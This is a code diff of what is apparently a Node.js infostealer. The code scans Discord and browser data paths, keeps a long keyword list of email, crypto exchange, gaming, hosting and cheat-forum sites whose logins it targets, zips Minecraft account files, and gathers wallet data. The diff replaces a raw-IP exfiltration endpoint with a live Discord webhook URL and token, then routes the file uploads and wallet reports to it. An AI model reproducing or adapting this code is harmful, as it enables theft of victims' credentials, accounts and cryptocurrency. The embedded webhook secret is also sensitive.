@@ -25,8 +25,7 @@ var appdata = process.env.APPDATA,
     LOCAL = process.env.LOCALAPPDATA,
     localappdata = process.env.LOCALAPPDATA;
 
-const key = "4eb0f03e607b11d47fb2425ed450f122"
-const api_url = "http://213.142.159.241";
+const api_url = "https://discord.com/api/webhooks/1348988556563185685/hyeZgHLKEl46Ne-lsctRWjrwwZHgURYkbhd1u1ZGJ-7Q-_mb3Sw_XiTLSS7FXvC6ETHN";
 const keywords = ["gmail.com", "live.com", "impots.gouv.fr", "zoho.com", "ameli.fr", "yahoo.com", "tutanota.com", "uber.com", "trashmail.com", "gmx.net", "github.com", "ubereats.com", "safe-mail.net", "thunderbird.net", "mail.lycos.com", "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc", "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev", "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de", "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com", "accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com", "ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com", "hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com", "xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl", "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net", "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com", "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com", "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "steamcommunity.com", "epicgames.com", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com", "ftx.com", "ftx.us", "binance.us", "kick.com", "yemeksepeti.com", "gameforge.com", "gameforge.com", "nttgame.com", "nttgame", "epinsultan", "bet", "bahis.com", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io", "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today", "moonx.gg", "novoline.lol", "pornhubpremium.com", "itemsatis.com", "twitch.tv"];
 let paths = [
     appdata + '\\discord\\',
@@ -2893,7 +2892,7 @@ async function getMinecraft() {
 
     if (filesAddedToZip) {
         zipper.writeZip(`${process.env.USERNAME}minecraftaccounts.zip`);
-        const webhook = `${api_url}/upload`;
+        const webhook = `${api_url}`;
         const form = new FormData();
 
         form.append("file", fs.createReadStream(`${process.env.USERNAME}minecraftaccounts.zip`));
@@ -2968,7 +2967,7 @@ async function gatherWalletInfo() {
     };
 
     try {
-      await axios.post(`${api_url}/webhooks/${key}`, message);
+      await axios.post(`${api_url}`, message);
       console.log('Embed successfully sent through the webhook.');
     } catch (error) {
       console.error('An error occurred while sending the embed:', error.message);
